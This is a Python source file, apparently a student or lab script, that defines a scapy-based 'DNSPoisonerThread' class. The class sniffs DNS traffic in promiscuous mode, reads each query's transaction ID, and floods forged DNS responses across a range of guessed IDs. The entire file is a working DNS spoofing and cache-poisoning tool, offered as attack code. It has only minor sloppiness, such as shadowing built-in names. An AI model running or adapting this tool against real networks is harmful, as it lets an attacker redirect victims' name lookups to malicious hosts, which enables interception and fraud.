from scapy.all import  *
from scapy.layers.dns import *
import threading

class DNSPoisonerThread:
    forged_packet = DNS()
    port_to_sniff = 53
    has_to_run = True
    id_range = 0
    MIN = 0
    MAX = 65535
    def set_id_range_of_attack(self, new_range):
        if new_range < 0:
            print("Incorrect Range insert")
            return
        self.id_range = new_range
    def set_port_to_sniff(self,new_port):
        self.port_to_sniff = new_port
    def set_packet(self, new_packet):
        self.forged_packet = new_packet
    def end_thread(self):
        self.has_to_run = False
    def work(self):
        while self.has_to_run:
            print("sniffing on " + str(self.port_to_sniff))
            sniffed_packet = sniff(filter="port "+str(self.port_to_sniff),count=1, promisc=1)
            for i in sniffed_packet:
                dns = DNS(i)
                dns.show()
                # dns = DNS(i)
                # dns[UDP].show()
                # dns[DNS].show()
                if dns.haslayer(DNS):
                    print("")
                    print("")
                    print("HAS DNS LAYER")
                    id = dns[DNS].id
                    range = [self.MIN, self.MAX]
                    print(range)
                    predicted_min = id - self.id_range
                    if predicted_min > 0:
                        range[0] = predicted_min
                    predicted_max = id + self.id_range
                    if predicted_max < self.MAX:
                        range[1] = predicted_max
                    count = range[0]
                    while count <= range[1]:
                        self.forged_packet[DNS].id = count
                        send(self.forged_packet)
                        count+=1
                else:
                    print("")
                    print("")
                    print("NO DNS LAYER")
    def run_thread(self):
        thread = threading.Thread(target=self.work, args=())
        thread.start()
